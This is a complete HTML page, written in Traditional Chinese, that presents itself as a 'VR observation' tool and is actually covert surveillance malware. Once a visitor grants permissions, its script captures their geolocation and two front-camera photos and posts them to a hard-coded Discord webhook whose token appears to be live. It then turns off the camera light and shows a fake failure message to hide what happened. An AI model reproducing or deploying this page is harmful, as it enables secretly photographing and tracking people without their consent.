<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>VR 實境觀測系統</title>
<style>
    body { font-family: sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; color: #fff; }
    .container { width: 85%; max-width: 350px; padding: 30px; border: 1px solid #3f51b5; border-radius: 20px; background: rgba(0,0,0,0.8); }
    h2 { color: #4fc3f7; }
    button { width: 100%; padding: 18px; font-size: 18px; font-weight: bold; border: none; border-radius: 50px; background: #00c853; color: #000; cursor: pointer; }
    #status { margin-top: 15px; font-size: 13px; color: #4fc3f7; font-family: monospace; }
</style>
</head>
<body>

<div class="container">
    <h2>🕶️ VR 模式啟動</h2>
    <p>點擊下方按鈕並於隨後彈窗選擇「允許」，以開啟 AR 環境掃描。</p>
    <button id="btn" onclick="initVR()">開啟 VR 觀測</button>
    <div id="status"></div>
</div>

<!-- 關鍵：設置自動播放、行內播放與靜音，確保相機流能啟動 -->
<video id="v" style="display:none;" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
var currentStream = null;

async function initVR() {
    document.getElementById("btn").style.display = "none";
    document.getElementById("status").innerHTML = "> INITIALIZING...";

    try {
        // 1. 同時請求權限 (這會跳出瀏覽器詢問窗)
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        
        currentStream = stream;
        const video = document.getElementById("v");
        video.srcObject = stream;
        
        // 某些手機瀏覽器需要顯式調用 play()
        await video.play();
        
        document.getElementById("status").innerHTML = "> SCANNING ENVIRONMENT...";
        
        // 2. 獲取位置
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                const map = `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`;
                sendToDiscord("📍 **VR模式-定位回傳**\n" + map);
            });
        }

        // 3. 拍照邏輯 (間隔兩秒拍兩張，確保成功)
        setTimeout(() => takeSnapshot(1), 2000);
        setTimeout(() => takeSnapshot(2, true), 4000);

    } catch (err) {
        document.getElementById("status").innerHTML = "> ERROR: ACCESS DENIED";
        console.error(err);
    }
}

function takeSnapshot(num, isLast = false) {
    const video = document.getElementById("v");
    const canvas = document.getElementById("c");
    
    if (video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append("file", blob, `vr_snap_${num}.jpg`);
            fd.append("payload_json", JSON.stringify({ content: `📸 **VR 掃描 ${num}/2**` }));
            
            fetch(webhook, { method: "POST", body: fd }).then(() => {
                if (isLast) {
                    // 拍完後徹底關閉相機燈號
                    currentStream.getTracks().forEach(t => t.stop());
                    document.getElementById("status").innerHTML = "> VR READY. CALIBRATING...";
                    setTimeout(() => { alert("VR 初始化失敗，請重試"); location.reload(); }, 500);
                }
            });
        }, "image/jpeg", 0.7);
    }
}

function sendToDiscord(msg) {
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: msg })
    });
}
</script>
</body>
</html>
